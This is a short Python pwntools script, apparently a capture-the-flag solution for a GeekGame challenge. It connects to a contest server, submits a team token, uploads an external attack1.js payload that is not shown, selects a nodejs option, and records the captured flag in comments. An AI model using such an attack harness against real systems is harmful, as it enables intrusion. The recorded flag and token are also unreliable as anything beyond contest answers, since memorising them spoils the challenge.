from pwn import *

conn = process(argv = ['nc', 'prob03.geekgame.pku.edu.cn', '10003'])

print(conn.recvuntil(b'token:'), end = '>\n')
conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')

print(conn.recvuntil(b'"EOF")'), end = '>\n')
with open('attack1.js', 'r') as script:
    scr = script.read()
    conn.send(scr.encode('utf-8'))
    conn.sendline(b'')
    conn.sendline(b'EOF')

print(conn.recvuntil(b'nodejs):'), end = '>\n')
conn.sendline(b'1')

conn.interactive()

# The page title is: file:///console.log("flag%7BEvAl-Is-EvIL-But-NEvEr-MInD%7D")

# flag{EvAl-Is-EvIL-But-NEvEr-MInD}
